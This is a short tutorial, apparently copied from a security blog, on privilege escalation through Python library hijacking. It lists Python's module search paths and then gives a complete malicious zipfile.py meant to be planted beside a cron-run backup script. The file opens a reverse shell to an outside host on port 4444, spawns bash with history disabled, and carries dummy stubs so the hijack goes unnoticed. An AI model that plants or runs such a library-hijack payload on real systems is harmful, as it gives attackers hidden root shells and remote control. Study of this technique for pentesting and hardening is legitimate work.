Python has a list of search paths for its libraries; meaning there is an opportunity for privilege escalation depending on mis-configurations of the system and how itâ€™s users are using it.

The paths that come configured out of the box on Ubuntu 16.04, in order of priority, are:

    Directory of the script being executed
    /usr/lib/python2.7
    /usr/lib/python2.7/plat-x86_64-linux-gnu
    /usr/lib/python2.7/lib-tk
    /usr/lib/python2.7/lib-old
    /usr/lib/python2.7/lib-dynload
    /usr/local/lib/python2.7/dist-packages
    /usr/lib/python2.7/dist-packages

For other distributions, run the command below to get an ordered list of directories:

  python -c 'import sys; print "\n".join(sys.path)'
  
Exploit example.

You review the libraries imported within a python script and see this.
###################################
    $ cat backup.py
    #!/usr/bin/env python
    import os
    import zipfile    
 ###################################
 
 If we wanted to gain remote access, we could create a new file, as www-data in the same directory as 
 backup.py, named zipfile.py, with the following content:
  
    import os
    import pty
    import socket

    lhost = "10.2.0.3"
    lport = 4444

    ZIP_DEFLATED = 0

    class ZipFile:
        def close(*args):
            return

        def write(*args):
            return

        def __init__(self, *args):
            return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()

Within this file, we have the code to gain a reverse shell (taken from python-pty-shells), but 
also an additional dummy class and constant, to make the file compatible with the program that is calling it.

The next time the cron job runs, backup.py will load our version of the zipfile library, due to it 
appearing first in the search paths (as the current directory always comes first), and subsequently execute 
our payload with elevated privileges!

https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
